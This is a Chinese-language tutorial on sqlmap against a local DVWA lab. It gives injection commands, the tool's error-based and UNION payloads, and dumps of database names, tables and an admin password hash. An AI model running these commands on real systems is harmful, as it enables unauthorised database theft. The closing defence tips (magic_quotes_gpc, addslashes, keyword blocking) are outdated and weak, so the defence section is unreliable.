#SQLmap1使用教程
****

###环境准备
>【环境】： window10
>>1.安装python2.7版本 [www.python.org]
>
>>2.安装SQLmap [http://sqlmap.org/]
>
>>3.设置python环境变量
>
>>4.下载DVWA [github：https://github.com/ethicalhack3r/DVWA]
>
>>5.安装DVWA，安装之前修改`config.inc.php.dist`修改为本地连接数据库
>
>>6.初始化DVMW，默认账号密码 [admin/password]

###查看命令
>sqlmap是一个python写的脚本文件
>
	python .\sqlmap.py  --version。

###GET注入方式——method 1
>1.到DVWA页面将安全级别[DVWA Security]设置为最低[low]
>
>2.到子页面[SQL Injection]随意输入数字生成URL，并复制URL和请求头cookie信息
>
>3.命令如下：其中`-u URL， –url=URL`是目标URL参数，`-–cookie=COOKIE`是HTTP Cookie头参数
>
	python .\sqlmap.py -u "http://127.0.0.1/Test/SQLmap/DVWA-master/vulnerabilities/sqli/?id=23&Submit=Submit#" --cookie "security=low; PHPSESSID=0qgf5586ed8ctvgb9q99mo8m27"

###GET注入方式——method 2
>1.另一种方法是把URL请求头生成一个文件，比如`requestHeader.txt`，信息如下：
>
	GET /Test/SQLmap/DVWA-master/vulnerabilities/sqli/?id=23&Submit=Submit HTTP/1.1
	Host: 127.0.0.1
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate
	Referer: http://127.0.0.1/Test/SQLmap/DVWA-master/vulnerabilities/sqli/?id=2&Submit=Submit
	Cookie: security=low; PHPSESSID=0qgf5586ed8ctvgb9q99mo8m27
	Connection: keep-alive
	Upgrade-Insecure-Requests: 1
>2.命令如下：其中`-r REQUESTFILE`表示从一个文件中载入HTTP请求。
>
	python .\sqlmap.py  -r "../requestHead.txt"

###分析注入结果
>1.代码展示：
>
	$id = $_REQUEST[ 'id' ];
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); 
>2.分析注入结果:
>
	---
	Parameter: id (GET)
	    Type: error-based
	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	    Payload: id=23' AND (SELECT 9278 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(9278=9278,1))),0x7170766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'piDS'='piDS&Submit=Submit
>	
	    Type: UNION query
	    Title: Generic UNION query (NULL) - 2 columns
	    Payload: id=23' UNION ALL SELECT CONCAT(0x71626a7a71,0x63574b7077415849755042794179506d7a77594157436269616a486e4943775a694d4857414c6246,0x7170766a71),NULL-- fmWn&Submit=Submit
	---
	[16:19:53] 
	[INFO] the back-end DBMS is MySQL
	web server operating system: Windows
	web application technology: Apache 2.4.23, PHP 5.6.27
	back-end DBMS: MySQL >= 5.0

>3-1.结果表示可以通过`error-based`方式注入，即**通过让目标机器的mysql server报错，来获取对应的信息**。

>3-2.结果表示可以通过`UNION query`方式注入，即**通过联合查询来获取数据库额外信息**，比如：
>
	SELECT first_name, last_name FROM users WHERE user_id = 23 
	UNION ALL 
	SELECT first_name,last_name FROM users 
 
>3-3.同时结果输出了操作系统、WEB服务器、数据库类型、数据库版本等信息。

##常用注入命令
>1.扫描并枚举数据库：`python .\sqlmap.py  -r "../requestHead.txt" --dbs`
	
	[11:26:12] [INFO] the back-end DBMS is MySQL
	web server operating system: Windows
	web application technology: Apache 2.4.23, PHP 5.6.27
	back-end DBMS: MySQL >= 5.0
	[11:26:12] [INFO] fetching database names
	available databases [7]:
	[*] blog
	[*] cloudagent
	[*] dvwa
	[*] information_schema
	[*] mysql
	[*] performance_schema
	[*] test


>2.扫描并枚举数据库表：`python .\sqlmap.py  -r "../requestHead.txt" -D blog --table --dump`

	Database: blog
	Table: user
	[5 entries]
	+----+----------------+-----------+
	| id | ip             | name      |
	+----+----------------+-----------+
	| 2  | 192.168.1.1    | Abby      |
	| 3  | 10.1.1.1       | Abby      |
	| 4  | 172.16.13.99   | Abby      |
	| 6  | 172.16.11.66   | Daisy     |
	| 10 | 220.117.131.12 | Christine |
	+----+----------------+-----------+
	
	Database: blog
	Table: blog_user
	[1 entry]
	+---------+-----------+----------------------------------+
	| user_id | user_name | user_pass                        |
	+---------+-----------+----------------------------------+
	| 1       | admin     | e10adc3949ba59abbe56e057f20f883e |
	+---------+-----------+----------------------------------+


>3.扫描并枚举&打印指定表：`python .\sqlmap.py  -r "../requestHead.txt" -D blog -T user --dump`


###POST注入方式
>1.命令如下：其中`-u URL, –url=URL`是目标URL参数，`-–cookie=COOKIE`是HTTP Cookie头参数，`-–data=DATA`是通过POST发送的数表单据字符串，`-–dbs`指的是扫描目标为数据库，`--batch 和 --smart`分别是"--batch 自动选yes"和"--smart 启发式快速判断"
>	
	python .\sqlmap.py -u "http://127.0.0.1/Test/SQLmap/DVWA-master/vulnerabil
	ities/xss_s/" --cookie="security=low; PHPSESSID=0qgf5586ed8ctvgb9q99mo8m27" --data="txtName=23&mtxMessage=12&btnSign=Sig
	n+Guestbook" --dbs --batch --smart


###SQL注入防范
>1.php.ini自动检测
>>php.ini文件中的一个设置：magic_quotes_gpc。为on时，php应用程序服务器将自动把用户提交的对SQL的查询进行转换，比如吧“’”转化为“\’”，它的作用是在敏感字符前加一个反斜杠“\”，这对防止SQL注入有重大作用。

>2.使用addslashes()
>>作用是在所有外部数据敏感字符’(单引号)、\(反斜杠)、NUL的前面加上反斜杠。

>3.增强前端输入字段检测
>>比如写一个函数，检测字段是否带有`SELECT`,`UPDATE`,`DELETE`,`DROP`类似字符串，有则拒绝查询。